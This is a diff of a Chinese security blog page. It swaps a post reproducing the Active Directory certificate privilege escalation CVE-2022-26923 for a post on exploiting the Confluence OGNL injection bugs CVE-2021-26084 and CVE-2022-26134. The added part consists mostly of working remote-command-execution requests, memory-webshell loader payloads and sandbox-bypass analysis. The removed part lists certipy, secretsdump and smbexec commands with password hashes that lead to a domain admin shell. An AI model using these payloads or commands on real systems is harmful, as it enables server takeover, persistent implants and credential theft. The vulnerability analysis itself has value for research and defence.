@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="域权限提升漏洞（CVE-2022–26923）, Hexo">
-    <meta name="description" content="域权限提升漏洞（CVE-2022–26923）这是第一次分析有关证书的漏洞（说实话，到写这篇文章为止，对域内证书相关的知识还不是很通透，不过还是用已有的知识尝试分析和复现该漏洞，于是有了这篇文章）。
-环境搭建Active Directory">
+    <meta name="keywords" content="Hexo">
+    <meta name="description" content="Confluence(CVE-2021-26084)本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。
+21的这个洞感觉有点像模板注入。confluence处理velocity模板，将velocity语法转为字">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +20,7 @@
 
     
 
-    <title>域权限提升漏洞（CVE-2022–26923） | Hexo</title>
+    <title>Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">域权限提升漏洞（CVE-2022–26923）</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -437,15 +437,6 @@
                 </div>
                 <div class="col s5 right-align">
                     
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                内网渗透
-                            </a>
-                        
-                    </div>
-                    
                 </div>
             </div>
 
@@ -453,7 +444,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-06-01
+                    2022-11-02
                 </div>
                 
 
@@ -477,81 +468,266 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="域权限提升漏洞（CVE-2022–26923）"><a href="#域权限提升漏洞（CVE-2022–26923）" class="headerlink" title="域权限提升漏洞（CVE-2022–26923）"></a>域权限提升漏洞（CVE-2022–26923）</h1><p>这是第一次分析有关证书的漏洞（说实话，到写这篇文章为止，对域内证书相关的知识还不是很通透，不过还是用已有的知识尝试分析和复现该漏洞，于是有了这篇文章）。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="Active-Directory-证书服务安装"><a href="#Active-Directory-证书服务安装" class="headerlink" title="Active Directory 证书服务安装"></a>Active Directory 证书服务安装</h3><p>由于该漏洞是依赖证书的，所以这里我们需要安装个证书服务(没有截图的步骤直接下一步)。</p>
-<p><img src="/Downloads/20220601224208.png"></p>
-<p><img src="https://pic1.zhimg.com/80/v2-e6f37f135ca1ef854044bea209d2f628_720w.jpg"></p>
-<p><img src="https://pic1.zhimg.com/80/v2-4db5037b7c04a8be4e819490e00bd134_720w.jpg"></p>
-<p><img src="/Downloads/20220601225141.png"></p>
-<p><img src="/Downloads/20220601225725.png"></p>
-<p><img src="/Downloads/20220601225917.png"></p>
-<p><img src="/Downloads/20220601230030.png"></p>
-<p><img src="/Downloads/20220601230126.png"></p>
-<p><img src="/Downloads/20220601230136.png"></p>
-<p>不想截了，后面的都默认下一步</p>
-<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>既然之前提到过这是一个和证书有关的漏洞，那么自然要介绍一些域内证书有关的知识。</p>
-<h3 id="Active-Directory-证书服务"><a href="#Active-Directory-证书服务" class="headerlink" title="Active Directory 证书服务"></a>Active Directory 证书服务</h3><p> PKI是一个术语，有些地方会采用中文的表述——公钥基本结构，用来实现证书的产生、管理、存储、分发和撤销等功能。我们可以把他理解成是一套解决方案，这套解决方案里面需要有证书颁发机构，有证书发布，证书撤掉等功能。</p>
-<p> 微软的Active Directory 证书服务(我们可以简称AD CS)就是对这套解决方案的实现。ADCS能够跟现有的ADDS服务进行结合，可以用以加密文件系统，数字签名，以及身份验证。虽然默认情况下没有为 Active Directory 环境安装 AD CS，但它如今已被广泛部署在各大企业和组织中。</p>
-<h3 id="Active-Directory-证书注册流程"><a href="#Active-Directory-证书注册流程" class="headerlink" title="Active Directory 证书注册流程"></a>Active Directory 证书注册流程</h3><p>要从 AD CS 获取证书，客户端需要经过⼀个称为注册的过程。概括地说，在注册期间，客户端⾸先根据活动目录 Enrollment Services 容器中的对象找到企业 CA。然后，客户端⽣成⼀个公钥&#x2F;私钥对，并将公钥、证书主题和证书模板名称等其他详细信息⼀起放⼊证书签名请求（CSR）消息中。然后，客户端使⽤其私钥签署 CSR，并将 CSR 发送到企业 CA 服务器。CA 服务器检查客户端是否可以请求证书。如果是，它会通过查找 CSR 中指定的证书模板 AD 对象来确定是否会颁发证书。CA 将检查证书模板 AD 对象的权限是否允许该账户获取证书。如果是，CA 将使用证书模板定义的 “蓝图” 设置（例如，EKU、加密设置和颁发要求等）并使用 CSR 中提供的其他信息（如果证书的模板设置允许）生成证书。CA 使用其私钥签署证书，然后将其返回给客户端。</p>
-<p><img src="https://whoamianony.oss-cn-beijing.aliyuncs.com/img/wTzhCQOfIlK6rmE.png"></p>
-<p>CA 颁发的证书可以提供加密（例如，加密⽂件系统）、数字签名（例如，代码签名）和⾝份验证（例如，对 AD）等多种服务，但本⽂将主要关注证书在客户端⾝份验证方面。</p>
-<h3 id="使用-AD-CS-证书进行客户端身份验证"><a href="#使用-AD-CS-证书进行客户端身份验证" class="headerlink" title="使用 AD CS 证书进行客户端身份验证"></a>使用 AD CS 证书进行客户端身份验证</h3><p>我们直接用漏洞作者开源的工具<a target="_blank" rel="noopener" href="https://github.com/ly4k/Certipy">Certipy</a> 进行测试。</p>
-<p>首先通过 Certipy 在 Marcus 用户的上下文中指定证书模板，为该用户申请证书，生成的证书将保存在 .pfx 格式的文件中，这里我们测试用的是一个普通域用户，而域用户默认情况下可以注册 User 证书模板，所以证书模板用的User</p>
-<pre class="language-none"><code class="language-none">certipy req whoamianony.org&#x2F;bunny:Bunny2021@192.168.93.30 -ca &#39;whoamianony-DC-CA&#39; -template &#39;User&#39;</code></pre>
+                <h1 id="Confluence-CVE-2021-26084"><a href="#Confluence-CVE-2021-26084" class="headerlink" title="Confluence(CVE-2021-26084)"></a>Confluence(CVE-2021-26084)</h1><p>本文没有对漏洞触发流程进行具体跟进，只是分析一些会影响到payload构造的点。</p>
+<p>21的这个洞感觉有点像模板注入。confluence处理velocity模板，将velocity语法转为字符串输出到页面，其中涉及到的一些表达式计算会调用<code>ognl.getValue()</code>处理。confluence处理vm文件，首先将vm内容转为AST语法树，然后分别处理每一个节点的内容，将每个节点的内容拼接输出。而我们构造的payload中的queryString就是其中一个节点。</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre class="language-none"><code class="language-none">POST &#x2F;pages&#x2F;createpage-entervariables.action HTTP&#x2F;1.1
+Host: ty.com:8090
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 47
 
-<p><img src="/Downloads/20220601223016.png"></p>
-<p>然后，我们可以使用颁发的证书对 KDC 进行 PKINIT Kerberos 身份验证，并获取该用户的 TGT 票据，如下图所示。</p>
-<pre class="language-none"><code class="language-none">certipy auth -pfx bunny.pfx -username bunny -domain whoamianony.org -dc-ip 192.168.93.30</code></pre>
+queryString&#x3D;%5Cu0027%2bClass%2b%5cu0027</code></pre>
 
-<p><img src="/Downloads/20220601223240.png"></p>
-<p>这里已经成功导出来TGT，并打印了该域用户的ntlm-hash。</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="UPN"><a href="#UPN" class="headerlink" title="UPN"></a>UPN</h3><p>当用户账户申请 User 模板证书时，用户帐户的用户主体名称（User Principal Name，UPN）将嵌入到证书中以进行识别。当我们使用证书进行身份验证时，KDC 会尝试将 UPN 从证书映射到目标用户。（可以理解为在用证书身份验证时，KDC会从证书中的UPN来判断证书对应的用户）。</p>
-<p>根据微软的 “<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c154285-454c-4353-9a99-fb586e806944">MS-ADTS (3.1.1.5.1.3 Uniqueness Constraints</a>)” 规范，UPN 必须是唯一的，这意味着不能同时有两个具有相同 UPN 的用户。我们可以尝试将一个用户的UPN改为另一个已经存在的用户的UPN，将会引发一个约束冲突。</p>
-<p><img src="/Downloads/20220601231846.png"></p>
-<p>这里可以看到，当我们把用户bunny的UPN改为<a href="mailto:&#x6d;&#x6f;&#x72;&#101;&#116;&#122;&#x40;&#119;&#x68;&#x6f;&#97;&#109;&#105;&#97;&#110;&#x6f;&#x6e;&#x79;&#x2e;&#111;&#x72;&#103;">&#x6d;&#x6f;&#x72;&#101;&#116;&#122;&#x40;&#119;&#x68;&#x6f;&#97;&#109;&#105;&#97;&#110;&#x6f;&#x6e;&#x79;&#x2e;&#111;&#x72;&#103;</a>时，引发了约束冲突，因为<a href="mailto:&#109;&#111;&#114;&#101;&#116;&#122;&#64;&#119;&#104;&#x6f;&#97;&#109;&#105;&#x61;&#x6e;&#x6f;&#110;&#121;&#x2e;&#x6f;&#114;&#103;">&#109;&#111;&#114;&#101;&#116;&#122;&#64;&#119;&#104;&#x6f;&#97;&#109;&#105;&#x61;&#x6e;&#x6f;&#110;&#121;&#x2e;&#x6f;&#114;&#103;</a>是独属于用户moretz的。</p>
-<h3 id="dNSHostName"><a href="#dNSHostName" class="headerlink" title="dNSHostName"></a>dNSHostName</h3><p>之前提到的用户账户在用证书进行身份验证时，KDC是通过UPN来识别认证账户的。然而机器账户是没有UPN属性的，那么计算机在使用证书进行身份验证时，是靠什么识别认证账户的呢？</p>
-<p>当计算机账户申请证书时，计算机的 DNS 属性值将被嵌入到证书中以进行识别。也就是dNSHostName。我们创建一个新的机器用户来验证</p>
-<pre class="language-none"><code class="language-none">python3 addcomputer.py whoamianony.org&#x2F;bunny:Bunny2021 -method LDAPS -computer-name DEMO\$ -computer-pass Passw0rd -dc-ip 192.168.93.30</code></pre>
+<p>![20221016205808](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016205808.png)</p>
+<p>首先来看这个POC，等号后面的值就是最终会传入<code>ognl.getValue()</code>的参数。解码后为<code>/u0027+Class+/u0027</code>。来看看poc为什么这样构造，首先从返回的结果上来看，返回的是一个class对象。对应到poc中的Class，有点像spring4shell那个洞的解析方式。表达式的本意是获取root中存放对象的class属性，从而会使其调用从Object继承而来的getClass方法来获取class属性，最终返回给我们。理解这点非常重要，因为后期要构造的Class.forName()中的Class并非<code>java.lang.Class</code>而是上面回显出的这个Class对象。</p>
+<p>下一个问题，为什么要构造<code>/u0027+...+/u0027</code>呢？首先我们要知道，&#x2F;u0027是单引号的unicode编码，实际上，payload可看成<code>&#39;+...+&#39;</code>，这种形式的payload基本不难猜出是为了闭合前后已经存在的单引号。</p>
+<p>![20221016212423](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016212423.png)</p>
+<p>事实也的确如此，那么为什么要以unicode编码的形式去添加单引号而不是直接用<code>&#39;</code>呢？我们先来看看使用<code>&#39;</code>会是什么效果。<br>![20221016213810](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016213810.png)</p>
+<p>可以看到这里的单引号被实体编码了，具体哪个位置编码的我们不去深究。实际上，Ognl表达式并不能解析实体编码，但可以正常处理unicode编码的单引号<code>\u0027</code>，所以可以用unicode编码替代。</p>
+<p>对于一个测试poc的分析到这里已经可以结束了。但要是想深度利用这个漏洞，还需要了解它的黑名单机制。</p>
+<p>![20221016214843](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016214843.png)</p>
+<p>在真正的去计算Ognl表达式前，会调用静态方法<code>SafeExpressionUtil.isSafeExpression</code>对编译后的结果进行安全检查。一共包括四个方面：</p>
+<ol>
+<li>第一个hashset限制了构造函数的关键字：new，静态方法调用：@符号</li>
+<li>第二个和第三个hashset限制了获取classloader，如：xxx.class或者xxx.getClass()</li>
+<li>第四个hashset限制了编译后的结果中不能出现特定的变量</li>
+</ol>
+<p>可以看到黑名单里有<code>class</code>，而我们payload的<code>Class</code>算是对其的一个绕过吧，除此之外，也可以用数组的方式其进行绕过拿到class对象。只要避开上面的限制，就可以深入利用了。</p>
+<h3 id="回显POC"><a href="#回显POC" class="headerlink" title="回显POC"></a>回显POC</h3><pre class="language-none"><code class="language-none">POST &#x2F;pages&#x2F;createpage-entervariables.action HTTP&#x2F;1.1
+Host: 192.168.0.153:8090
+cmd: id
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 444
 
-<p><img src="/Downloads/20220601233747.png"></p>
-<p>这里创建了一个名为DEMO$的机器账户，我们看一下它的dnsHostName</p>
-<p><img src="/Downloads/20220602203825.png"></p>
-<p>这里我们创建的DEMO用户的<code>dnsHostName</code>为<code>DEMO.whoamianony.org</code>。那么我们给DEMO申请一个证书观察一下内容(机器用户默认情况下可以注册Machine证书模板)。</p>
-<pre class="language-none"><code class="language-none">certipy req whoamianony.org&#x2F;DEMO\$:Passw0rd@192.168.93.30 -ca &#39;whoamianony-DC-CA&#39; -template &#39;Machine&#39;</code></pre>
+版本一：（返回在响应头中，数据多的话会比较乱）
+queryString&#x3D;\u0027%2bClass.forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(\u0027result\u0027%2Corg.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(\u0027cmd\u0027)).getInputStream(),\u0027utf-8\u0027));\u0022)%2b\u0027
 
-<p><img src="/Downloads/20220602205330.png"></p>
-<p>可以观察到，这里的证书中的DNS主机名也是<code>DEMO.whoamianony.org</code>。</p>
-<p>而然这里的<code>dnsHostName</code>不同于之前的UPN的是，UPN 必须是唯一的，而在 “<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c154285-454c-4353-9a99-fb586e806944">MS-ADTS (3.1.1.5.1.3 Uniqueness Constraints)</a>” 文档中，并没有提及计算机帐户的 <code>dNSHostName</code>属性必须是唯一的。并且，对于计算机账户的创建者来说，他们拥有对目标计算机的 “Validated write to computer attributes” 权限，也就是说计算机账户的创建对计算机对象的 AD 属性具有写入权限。到了这里，漏洞产生的原因已经浮出水面了。<strong>如果我们将DEMO$账户的<code>dnsHostName</code>改为与域控制器的计  算机账户相同的值，那么就可以欺骗AD CS，并最终申请到域控制器的 AD 证书</strong>。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>接下来，我们尝试修改DEMO用户的<code>dnsHostName</code>为DC的<code>dnsHostName</code></p>
-<p><img src="/Downloads/20220602210927.png"></p>
-<p>这里我们观察到，修改时出现了一个与之前修改UPN时不同的错误，</p>
-<h3 id="删除SPN并修改dnsHostName"><a href="#删除SPN并修改dnsHostName" class="headerlink" title="删除SPN并修改dnsHostName"></a>删除SPN并修改dnsHostName</h3><p>在这前的noPac的提权漏洞中，在更改在 <code>sAMAccountName</code> 属性值的之前，我们需要预先清除掉计算机账户的 <code>servicePrincipalName</code> 属性。这是因为 <code>sAMAccountName</code> 属性与 <code>servicePrincipalName</code>  （SPN）属性相关联。</p>
-<p>同样，<code>dNSHostName</code> 属性也与 <code>servicePrincipalName</code> 属性相关联。如果我们修改 <code>PENTEST$</code> 账户的 <code>dNSHostName</code> 属性值，那么 <code>DEMO$</code> 账户的 <code>servicePrincipalName</code> 属性中默认的 <code>RestrictedKrbHost/DEMO.whoamianony.org</code> 和 <code>HOST/DEMO.whoamianony.org</code> 这两条 SPN 将使用新的 DNS 主机名更新。</p>
-<p><img src="/Downloads/20220602213654.png"></p>
-<p>然而，在我们将<code>dnsHostName</code>更改为<code>DC.whoamianony.org</code>(我这里的域环境的域控名为DC)时，这两条SPN将自动更新为<code>RestrictedKrbHost/DC.whoamianony.org</code> 和 <code>HOST/DC.whoamianony.org</code> </p>
-<p><img src="/Downloads/20220602212845.png"></p>
-<p>如上图所示，与域控的这两条SPN也是<code>RestrictedKrbHost/DC.whoamianony.org</code> 和 <code>HOST/DC.whoamianony.org</code>，根据 “<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/3c154285-454c-4353-9a99-fb586e806944">MS-ADTS (3.1.1.5.1.3 Uniqueness Constraints)</a>” 文档中所描述的，<code>servicePrincipalName</code> 属性具有唯一性，所以将与 <code>DC$</code> 的 <code>servicePrincipalName</code> 属性引发约束冲突。</p>
-<p>因此，在修改<code>dnsHostName</code>属性前，我们需要预先删除 <code>DEMO$</code> 账户中包含 <code>dNSHostName</code> 的 <code>servicePrincipalName</code> 属性值</p>
-<p><img src="/Downloads/20220602213813.png"></p>
-<p>然后修改<code>DEMO$</code>账户的<code>dnsHostName</code>为<code>DC.whoamianony.org</code></p>
-<p><img src="/Downloads/20220602214109.png"></p>
-<h3 id="为域控申请证书"><a href="#为域控申请证书" class="headerlink" title="为域控申请证书"></a>为域控申请证书</h3><p>如果我们以计算机账户 <code>DEMO$</code> 的身份申请 Machine 模板证书，<code>DEMO$</code> 的 <code>dNSHostName</code> 属性值将嵌入到证书中作为主题备用名称。而此时我们<code>DEMO$</code>用户的 <code>dNSHostName</code> 已被修改为了和域控一样的<code>DC.pentest.com</code>,所以我们能用<code>DEMO$</code>用户请求到域控的机器账户的证书。</p>
-<pre class="language-none"><code class="language-none">certipy req whoamianony.org&#x2F;DEMO\$:Passw0rd@192.168.93.30 -ca &#39;whoamianony-DC-CA&#39; -template &#39;Machine&#39;</code></pre>
+版本二：（返回在响应体中，但会有大量模板数据）
+queryString&#x3D;\u0027%2bClass.forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022var%20a&#x3D;com.opensymphony.webwork.ServletActionContext.getResponse().getWriter();a.write(new java.util.Scanner(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(\u0027cmd\u0027)).getInputStream()).useDelimiter(\u0027dasjkl\u0027).next());a.flush();a.close();\u0022)%2b\u0027</code></pre>
 
-<p><img src="/Downloads/20220602205117.png"></p>
-<p>接着，我们通过颁发的证书对 KDC 进行 PKINIT Kerberos 身份验证，并获取域控制器账户的 TGT 票据，如下图所示。</p>
-<pre class="language-none"><code class="language-none">certipy auth -pfx dc.pfx -username DC\$ -domain whoamianony.org -dc-ip 192.168.93.30</code></pre>
+<h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p>直接用tomcat原生的内存马就行(22沙箱版的思路在这里也可以使用)</p>
+<pre class="language-none"><code class="language-none">POST &#x2F;pages&#x2F;createpage-entervariables.action HTTP&#x2F;1.1
+Host: 192.168.0.153:8090
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 1960
 
-<p><img src="/Downloads/20220602214948.png"></p>
-<p>可以 看到，这里已经导出了域控的TGT，以及域控机器账号的hash。</p>
-<h3 id="DCSync-转储域用户哈希"><a href="#DCSync-转储域用户哈希" class="headerlink" title="DCSync 转储域用户哈希"></a>DCSync 转储域用户哈希</h3><pre class="language-none"><code class="language-none">python3 secretsdump.py &#39;whoamianony.org&#x2F;dc$@192.168.93.30&#39; -hashes :1f5760f5fb6e8ce345014d607ac69489 </code></pre>
+queryString&#x3D;\u0027%2bClass.forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022try &#123;load(\u0027nashorn:mozilla_compat.js\u0027); &#125; catch (e) &#123;&#125; importPackage(Packages.java.util);importPackage(Packages.java.lang); importPackage(Packages.java.io); function Base64DecodeToByte(str) &#123;importPackage(Packages.sun.misc);importPackage(Packages.java.util);var bt;try &#123; bt &#x3D; new BASE64Decoder().decodeBuffer(str);&#125; catch (e) &#123;bt &#x3D; new Base64().getDecoder().decode(str);&#125;return bt;&#125; function define(Classdata) &#123;var classBytes &#x3D; Base64DecodeToByte(Classdata);var byteArray &#x3D; Java.type(\u0027byte[]\u0027);var int &#x3D; Java.type(\u0027int\u0027);var defineClassMethod &#x3D; java.lang.ClassLoader.class.getDeclaredMethod(\u0027defineClass\u0027,byteArray.class,int.class,int.class);defineClassMethod.setAccessible(true);var cc &#x3D; defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(),classBytes,0,classBytes.length);return cc.getConstructor().newInstance(); &#125; define(\u0027yv66vgAA..\u0027);\u0022)%2b\u0027</code></pre>
 
-<p><img src="/Downloads/20220602215306.png"></p>
-<p>此处可以看见已经导出了域管账号的hash值，我们直接用smbexec.py远控。</p>
-<pre class="language-none"><code class="language-none">python3 smbexec.py &#39;whoamianony.org&#x2F;Administrator@192.168.93.30&#39; -hashes :ab89b1295e69d353dd7614c7a3a80cec</code></pre>
+<h1 id="Confluence-CVE-2022-26134"><a href="#Confluence-CVE-2022-26134" class="headerlink" title="Confluence(CVE-2022-26134)"></a>Confluence(CVE-2022-26134)</h1><p>这个洞可以分成两部分去看，一个是7.15版本以前的原始版，另一个是7.15版本以后的沙箱版。但无论哪个版本，漏洞的成因都是相同的。</p>
+<h2 id="原始版"><a href="#原始版" class="headerlink" title="原始版"></a>原始版</h2><h3 id="回显POC-1"><a href="#回显POC-1" class="headerlink" title="回显POC"></a>回显POC</h3><pre class="language-none"><code class="language-none">POST 	&#x2F;%24%7BClass.forName(%22javax.script.ScriptEngineManager%22).newInstance().getEngineByName(%22js%22).eval(%22com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;%2Corg.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;))%3B%22)%7D&#x2F; HTTP&#x2F;1.1
+Host: localhost:8091
+cmd: whoami
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 0</code></pre>
 
-<p><img src="/Downloads/20220602215748.png"></p>
-<p>已经成功拿到了一个交互式的shell。</p>
+<pre class="language-none"><code class="language-none">&#x2F;$&#123;Class.forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;com.opensymphony.webwork.ServletActionContext.getResponse().setHeader(&#39;result&#39;,org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(com.opensymphony.webwork.ServletActionContext.getRequest().getHeader(&#39;cmd&#39;)).getInputStream(),&#39;utf-8&#39;));&quot;)&#125;&#x2F;</code></pre>
+
+<p>一定不要忘了最后的的斜杠，因为系统获取payload的方法是<code>lastIndexOf(&quot;/&quot;)</code>，这个版本的触发点和21版的很相似，都在OgnlValueStack的findValue方法中。但比起21的洞来说，这版少了黑名单的限制，也无需闭合单引号以及对引号做转码处理（毕竟两个洞的成因和触发流程不同）。但除此之外，我们对payload进行了${}的处理。这点可以看到源码</p>
+<p>![20221016164016](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016164016.png)</p>
+<p>在将payload传入findValue方法前做了一个正则匹配处理。这里要注意一点的是，由于这个正则的存在，所以我们的payload中<code>$&#123;&#125;</code>里的内容中不能含有<code>&#125;</code>，否则这个<code>&#125;</code>会直接去匹配前面的<code>&#123;</code>，导致payload被截断，无法正常执行。</p>
+<h3 id="内存马-1"><a href="#内存马-1" class="headerlink" title="内存马"></a>内存马</h3><p>Confluence本身有spring的依赖，所以可以选择直接通过调用<code>org.springframework.cglib.core.ReflectUtils.defineClass</code>加载字节码来打入内存马</p>
+<pre class="language-none"><code class="language-none">POST &#x2F;%24%7B%40org.springframework.cglib.core.ReflectUtils%40defineClass(&#39;Memshell&#39;%2C%40org.springframework.util.Base64Utils%40decodeFromString(%40com.opensymphony.xwork.ActionContext%40getContext().getParameters().get(&#39;code&#39;))%2Cnew%20javax.management.loading.MLet(new%20java.net.URL%5B0%5D%2C%40java.lang.Thread%40currentThread().getContextClassLoader()))%7D&#x2F; HTTP&#x2F;1.1
+Host: localhost:8091
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko&#x2F;20100101 Firefox&#x2F;105.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application&#x2F;x-www-form-urlencoded
+Content-Length: 8973
+
+code&#x3D;yv66vgAA</code></pre>
+
+<pre class="language-none"><code class="language-none">&#x2F;$&#123;@org.springframework.cglib.core.ReflectUtils@defineClass(&#39;Memshell&#39;,@org.springframework.util.Base64Utils@decodeFromString(@com.opensymphony.xwork.ActionContext@getContext().getParameters().get(&#39;code&#39;)),new javax.management.loading.MLet(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader()))&#125;&#x2F;</code></pre>
+
+<h2 id="沙箱版"><a href="#沙箱版" class="headerlink" title="沙箱版"></a>沙箱版</h2><p>从7.15版本开始，Confluence在OGNL表达式解析时加入了沙箱设置。沙箱存在于xwork的jar包中。我们diff一下两个版本的jar包进行观察。</p>
+<p>![20221016165046](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016165046.png)</p>
+<p>可以明显观察到这里多了一个SafeExpressionUtil.class。再对比一下<code>findValue</code>方法的执行点</p>
+<p>![20221016165435](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016165435.png)</p>
+<p>在执行<code>findValue</code>方法前也是多了一个表达式安全的判断。</p>
+<p>我们看到这个中，主要的表达式安全判别代码如下图所示</p>
+<p>![20221016170429](C:\Users\Icesoul\Documents\Tencent Files\1437565342\Image\SharePic\20221016170429.png)</p>
+<p>配合系统中的黑名单和白名单一起判别。</p>
+<p>黑名单</p>
+<pre class="language-none"><code class="language-none">sun.misc.Unsafe
+classLoader
+java.lang.System
+java.lang.ThreadGroup
+com.opensymphony.xwork.ActionContext                 java.lang.Compiler
+com.atlassian.applinks.api.ApplicationLinkRequestFactory
+java.lang.Thread
+com.atlassian.core.util.ClassLoaderUtils
+java.lang.ProcessBuilder
+java.lang.InheritableThreadLocal
+com.atlassian.core.util.ClassHelper
+class
+java.lang.Shutdown
+java.lang.ThreadLocal
+java.lang.Process
+java.lang.Package
+org.apache.tomcat.InstanceManager
+java.lang.Runtime
+javax.script.ScriptEngineManager
+javax.persistence.EntityManager
+org.springframework.context.ApplicationContext
+java.lang.SecurityManager
+java.lang.Object
+java.lang.Class
+java.lang.RuntimePermission
+javax.servlet.ServletContext
+java.lang.ClassLoader
+java.rmi
+sun.management
+org.apache.catalina.session
+java.jms
+com.atlassian.confluence.util.io
+com.google.common.reflect
+javax.sql
+java.nio
+com.atlassian.sal.api.net
+sun.invoke
+java.util.zip
+liquibase
+com.hazelcast
+org.apache.commons.httpclient
+com.atlassian.util.concurrent
+java.net
+freemarker.ext.jsp
+com.sun.jna
+net.java.ao
+javax
+sun.corba
+org.springframework.util.concurrent
+com.sun.jmx
+sun.misc
+javassist
+ognl
+org.apache.commons.exec
+com.atlassian.cache
+org.wildfly.extension.undertow.deployment                 java.lang.reflect
+io.atlassian.util.concurrent
+java.util.concurrent
+com.atlassian.confluence.util.http
+sun.tracing
+org.objectweb.asm
+freemarker.template
+net.sf.hibernate
+freemarker.core
+net.bytebuddy
+org.apache.tomcat
+freemarker.ext.rhino
+com.atlassian.media
+org.springframework.context
+org.apache.velocity
+javax.xml
+java.sql
+sun.reflect
+sun.net
+javax.persistence
+org.javassist
+javax.naming
+org.apache.httpcomponents.httpclient
+com.atlassian.hibernate
+sun.nio
+com.atlassian.confluence.impl.util.sandbox
+com.google.common.net
+com.atlassian.filestore
+org.apache.commons.io
+com.atlassian.vcache
+jdk.nashorn
+sun.launcher
+oshi
+org.apache.bcel
+sun.rmi
+sun.tools.jar
+org.springframework.expression.spel
+com.opensymphony.xwork.util
+org.ow2.asm
+com.atlassian.confluence.setup.bandana
+org.quartz
+net.sf.cglib
+com.atlassian.activeobjects
+com.atlassian.utils.process
+sun.security
+com.atlassian.quartz
+javax.management
+sun.awt.shell
+com.google.common.cache
+org.apache.http.client
+java.io
+com.atlassian.confluence.util.sandbox
+java.util.jar
+com.atlassian.scheduler
+sun.print
+com.atlassian.failurecache
